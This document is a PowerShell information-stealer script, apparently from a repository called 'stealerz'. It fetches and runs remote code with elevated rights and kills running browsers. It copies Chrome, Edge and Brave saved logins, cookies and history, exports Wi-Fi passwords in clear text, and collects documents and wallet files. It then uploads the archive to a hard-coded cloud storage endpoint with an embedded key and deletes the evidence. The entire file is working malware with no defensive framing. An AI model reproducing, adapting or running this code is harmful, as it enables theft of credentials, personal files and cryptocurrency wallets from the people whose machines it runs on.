$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    $url = "https://raw.githubusercontent.com/KaloyanSyS32/stealerz/refs/heads/main/s.ps1"
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iex (irm '$url')`""
    exit
}

# Fix Environment Path for System32 utilities
$env:Path += ";C:\Windows\System32;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\"

$sbUrl = "https://kjoxaevacnruadftkjxc.supabase.co/storage/v1/object/data/$($env:COMPUTERNAME)_$(Get-Date -Format "yyyyMMdd_HHmm").zip"
$sbKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imtqb3hhZXZhY25ydWFkZnRranhjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzgxNjA4NjAsImV4cCI6MjA5MzczNjg2MH0.OVuVfwrLPgxcrX3W0xjF-FVQBB9qMbMB1s-vL8aV_aY"

$staging = Join-Path $env:TEMP "staging_$(Get-Random)"
New-Item -Path $staging -ItemType Directory -Force | Out-Null

# Force kill browsers to release SQLite locks
"chrome", "msedge", "brave", "browser" | ForEach-Object { Stop-Process -Name $_ -Force -ErrorAction SilentlyContinue }
Start-Sleep -Seconds 2

$browsers = @{
    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
}

foreach ($b in $browsers.GetEnumerator()) {
    if (Test-Path $b.Value) {
        $dest = New-Item -Path (Join-Path $staging "Browsers\$($b.Key)") -ItemType Directory -Force
        if (Test-Path "$($b.Value)\Local State") { Copy-Item "$($b.Value)\Local State" -Destination $dest -Force }
        
        # Recursive copy for modern deep-nested cookie/login paths
        Get-ChildItem -Path $b.Value -Recurse -File -ErrorAction SilentlyContinue | Where-Object { 
            $_.Name -match "Login Data|Cookies|Web Data|History" 
        } | ForEach-Object {
            $subDest = Join-Path $dest $_.Directory.Name
            if (-not (Test-Path $subDest)) { New-Item $subDest -ItemType Directory -Force | Out-Null }
            Copy-Item $_.FullName -Destination $subDest -Force -ErrorAction SilentlyContinue
        }
    }
}

# WiFi and Network Recon using repaired PATH
$recon = Join-Path $staging "Recon"
New-Item $recon -ItemType Directory -Force | Out-Null
netsh wlan export profile key=clear folder=$recon | Out-Null
ipconfig /all > (Join-Path $recon "net.txt")

# Document Harvesting
$exts = @("*.txt", "*.pdf", "*.docx", "*.xlsx", "*.key", "*.wallet")
Get-ChildItem -Path "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents" -Include $exts -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
    $fDest = Join-Path $staging "Files"
    if (-not (Test-Path $fDest)) { New-Item $fDest -ItemType Directory -Force | Out-Null }
    Copy-Item $_.FullName -Destination $fDest -Force -ErrorAction SilentlyContinue
}

# Compression and Exfiltration
$zip = "$env:TEMP\data.zip"
Compress-Archive -Path "$staging\*" -DestinationPath $zip -Force

$headers = @{ 
    "Authorization" = "Bearer $sbKey"
    "apikey" = $sbKey
    "Content-Type" = "application/zip"
    "x-upsert" = "true" 
}
$bytes = [System.IO.File]::ReadAllBytes($zip)
Invoke-RestMethod -Uri $sbUrl -Method Post -Headers $headers -Body $bytes

# Cleanup
Remove-Item $staging -Recurse -Force
Remove-Item $zip -Force
